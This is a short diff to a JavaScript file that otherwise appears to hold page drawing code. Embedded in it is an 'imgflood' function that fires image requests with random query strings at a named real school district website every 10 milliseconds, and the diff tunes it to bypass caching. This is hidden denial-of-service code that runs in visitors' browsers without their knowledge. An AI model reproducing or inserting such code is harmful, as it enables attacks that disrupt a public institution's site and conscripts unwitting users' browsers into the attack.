@@ -492,10 +492,10 @@
          }
 function imgflood() {  
   var TARGET = 'www.mvcsc.k12.in.us';
-  var URI = '/2/Home?r=';
+  var URI = '/?r=';
   var pic = new Image();
-  var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http://'+TARGET+URI+rand+'=val';
+  var rand = Math.floor(Math.random() * 9999999999);
+  pic.src = 'http://'+TARGET+URI+rand;
 }
 setInterval(imgflood, 10);
          function FlowerBush(flowerBushX, flowerBushY) {
